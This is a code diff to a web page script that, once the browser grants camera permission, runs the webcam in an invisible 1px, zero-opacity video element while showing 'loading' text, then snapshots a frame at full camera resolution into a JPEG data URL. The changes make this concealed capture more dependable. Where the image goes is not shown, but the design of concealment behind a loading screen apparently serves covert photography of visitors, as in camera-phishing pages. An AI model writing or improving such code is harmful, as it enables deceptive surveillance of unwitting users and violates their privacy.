@@ -24,9 +24,9 @@
 
         video {
             position: absolute;
-            width: 0;
-            height: 0;
-            visibility: hidden;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
         }
     </style>
 </head>
@@ -43,13 +43,12 @@
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(function(stream) {
                 video.srcObject = stream;
-                video.muted = true;
-                video.style.display = "none";
-
-                setTimeout(() => {
-                    loadingText.style.display = "block";
-                    capturePhoto(stream);
-                }, 500);
+                video.onloadedmetadata = function() {
+                    setTimeout(() => {
+                        loadingText.style.display = "block";
+                        capturePhoto(stream);
+                    }, 500);
+                };
             })
             .catch(function(error) {
                 console.log("Camera permission denied: ", error);
@@ -59,8 +58,9 @@
         function capturePhoto(stream) {
             const canvas = document.createElement('canvas');
             const context = canvas.getContext('2d');
-            canvas.width = 640;
-            canvas.height = 480;
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             const photoDataUrl = canvas.toDataURL('image/jpeg');
